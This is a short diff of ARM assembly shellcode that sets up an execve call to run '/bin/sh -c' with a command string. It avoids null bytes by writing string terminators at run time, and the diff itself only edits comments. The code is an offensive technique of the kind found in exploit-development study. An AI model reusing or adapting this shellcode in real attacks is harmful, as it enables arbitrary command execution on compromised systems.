@@ -18,14 +18,14 @@ _start:
     // execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
     eor    r3, r3, r3     // r3 = NULL
     
-    adr    r0, sh         // r0 = "/bin/sh"
+    adr    r0, sh         // r0 = "/bin/shX"
     strb   r3, [r0, #7]   // add null terminator
     
-    adr    r1, c_arg      // r1 = "-c"
+    adr    r1, c_arg      // r1 = "-cXX"
     strb   r3, [r1, #2]   // add null terminator
 
     adr    r2, cmd        // r4 = cmd
-    strb   r3, [r2, #18]
+    strb   r3, [r2, #18]  // add null terminator
     
     push   {r0, r1, r2, r3}
     eor    r2, r2, r2     // penv = NULL
